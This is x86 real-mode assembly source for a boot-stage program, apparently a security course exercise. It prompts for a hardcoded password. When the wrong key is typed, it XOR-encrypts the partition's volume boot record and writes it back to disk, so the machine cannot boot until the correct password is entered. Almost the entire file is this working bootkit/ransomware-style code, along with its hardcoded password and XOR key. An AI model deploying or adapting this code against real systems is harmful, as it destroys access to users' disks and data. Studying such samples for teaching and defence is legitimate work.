;
; This code attempts to encrypt the clean vbr if type wrong password.
; If the vbr is already encrypted then do nothing.
; If type the right password and decrypt (if encrypt) and boot normally
;
; Written by: Your boss from COMP6845
;

[bits 16]
[org 0x800]

%define SECTOR_TWO_ADDR         0x800
%define NEW_MBR_ADDR            0x600
%define VBR_ADDR                0x7c00
%define START_VBR_LBA_OFFSET    0x8

%define SECTOR_RW_ADDR          0x1500
%define PARTITION_OFFSET        0x1be
%define SIGNATURE_OFFSET        0x1fe
%define PARTITION_ENTRY_SIZE    0x10
%define XOR_LENGTH              0x10

_start:
    pusha

    mov BYTE [drive_type], dl
    
    call _check_input
    
    popa
    retf
    
_encrypt:
    call _check_partition
    xor WORD [VBR_ADDR + SIGNATURE_OFFSET], 0xaa55
    jz _xor
    
    mov si, secret
    call _print_str
    
    ret

_decrypt:
    call _check_partition
    cmp WORD [VBR_ADDR + SIGNATURE_OFFSET], 0xaa55
    jnz _xor
    
    mov si, xor_string
    call _print_str
    
    ret

_check_partition:
    ; check for bootable partition
    mov bx, NEW_MBR_ADDR + PARTITION_OFFSET
    mov cx, 0x4

_loop:
    mov al, BYTE [bx]
    cmp al, 0x80
    jz _found_os
    add bx, 0x10
    dec cx
    jz _no_os_error
    jmp _loop

_found_os:
    mov dl, BYTE [drive_type]
    mov WORD [part_offset], bx

    call _reset_disk

_check_extensions:
    mov ah, 0x41
    mov bx, 0x55aa
    int 0x13
    jc _read_with_chs

    ; construct the DAP packet
    mov bx, WORD [part_offset]
    mov esi, DWORD [bx + START_VBR_LBA_OFFSET]

    push DWORD 0x0
    push esi

    push 0x0
    push VBR_ADDR

    push 0x1
    push 0x10

    mov si, sp

_read_with_lba:
    call _read_sector_lba
    add sp, 0x10
    
    ret

_read_with_chs:
    mov bp, WORD [part_offset]
    mov al, 0x1                     ; we want to read one sector
    mov dh, BYTE [bp + 0x1]         ; head
    mov ch, BYTE [bp + 0x2]         ; cylinder
    mov cl, BYTE [bp + 0x3]         ; sector
    mov bx, VBR_ADDR                ; addr to store the VBR
    call _read_sector
    
    ret

_reset_disk:
    mov ah, 0x0
    int 0x13                    ; reset the disk
    jc _reset_error
    ret

_read_sector:
    mov ah, 0x2                 ; code for specifying reading sectors
    int 0x13
    jc _read_error
    ret

_read_sector_lba:
    mov ah, 0x42
    int 0x13
    jc _read_error
    ret

_write_sector:
    mov ah, 0x3
    int 0x13
    jc _write_error
    ret

_no_os_error:
    mov si, no_os_error_msg
    call _print_str
    jmp _end_loop

_write_error:
    mov si, write_error_msg
    call _print_str
    hlt

_reset_error:
    mov si, reset_disk_error_msg
    call _print_str
    hlt

_read_error:
    mov si, read_disk_error_msg
    call _print_str
    hlt

_print_str:
    lodsb
    or al, al           ; did we reach a null byte?
    jz _print_end
    mov ah, 0xe
    int 0x10
    jmp _print_str

_print_end:
    ret

_check_input:
    xor bx, bx
_in_loop:
	cli
	xor ax, ax
    int 16h                 ; get_key interrupt 
	
	mov dl, al              ; get_key places next keypress into al
	mov [buf], dl	    	; move char entered by user into buf
	
	mov cl, BYTE [secret + bx]
	or  cl, cl
	jz  _decrypt
	xor dl, cl
	jnz _encrypt
	inc bx
	xor cx, cx
	 
	mov si, buf             ; SI now points to our message
_out_loop:
    lodsb                   ; Loads SI into AL and increments SI [next char]
	mov ah, 0x0e            ; Indicate BIOS we're going to print chars
	or al, al               ; Checks if the end of the string
	jz _in_loop             ; Jump back to the main loop
	int 0x10                ; Otherwise, call interrupt for printing the char
	jmp _out_loop           ; Next iteration of the loop

_xor:
    ; read the sector containing the vbr into memory
    mov dl, BYTE [drive_type]
    mov bp, WORD [part_offset]
    mov al, 0x1                 ; num of sectors to read
    mov ch, BYTE [bp + 0x2]     ; cylinder to read from
    mov dh, BYTE [bp + 0x1]     ; head to read from
    mov cl, BYTE [bp + 0x3]     ; sector to read from
    mov bx, VBR_ADDR            ; where to store the sector we read
    call _read_sector
    
    ; xor the vbr
    lea di, [VBR_ADDR]
    xor bx, bx                  ; use bx as counter
_xor_loop:
    cmp bx, 0x200               ; loop 512 times ~ a sector/the vbr
    jge _xor_end
    
    ; mod the counter to repeat xor string
    xor dx, dx                  ; dx contains remainder
    mov ax, bx                  ; load current counter/index to ax
    mov cx, XOR_LENGTH          ; length of xor string
    div cx                      ; do ax / cx
                                ; dx contains remainder, ax contains quotient
    mov cx, bx                  ; save current counter/index
    mov bx, dx                  ; use remainder to index into xor string
    mov al, BYTE [xor_string + bx]      ; can only use bx to index [] in asm
    mov bx, cx
    mov cl, BYTE [di + bx]      ; use current counter to index to entry/memory
    xor al, cl
    mov [di + bx], al
    
    inc bx
    jmp _xor_loop
_xor_end:
    xor ax, ax                  ; null out registers else error
    
    ; write the local copy of the partition onto the disk
    mov dl, BYTE [drive_type]
    mov bp, WORD [part_offset]
    mov al, 0x1                 ; num of sectors to write
    mov ch, BYTE [bp + 0x2]     ; cylinder to write to
    mov dh, BYTE [bp + 0x1]     ; head to write to
    mov cl, BYTE [bp + 0x3]     ; sector to write to
    mov bx, VBR_ADDR            ; where the sector we want to write to
    call _write_sector
    ret

_end_loop:                  ; after printing an error, we should just loop forever
    jmp _end_loop

buf:                        db 0           ; 1-byte buffer to write keypresses to
                            db 0x00
secret:                     db "l1st3n t0 ur h34rt", 0x00
reset_disk_error_msg:       db "Error resetting disk.", 0x0d, 0x0a, 0x00
read_disk_error_msg:        db "Error reading sector.", 0x0d, 0x0a, 0x00
write_error_msg:            db "Error writing sector.", 0x0d, 0x0a, 0x00
no_os_error_msg:            db "No operating system found!", 0x0d, 0x0a, 0x00
xor_string:                 db "wh4Tz d0_u W4nt?"
drive_type:                 db 0x00
part_offset:                dw 0x0000

; fill the mbr will null bytes to acquire the 512 byte size
times 0x1fe - ($ - $$) db 0x00

; boot signature
;dw 0xaa55
dw 0x0000
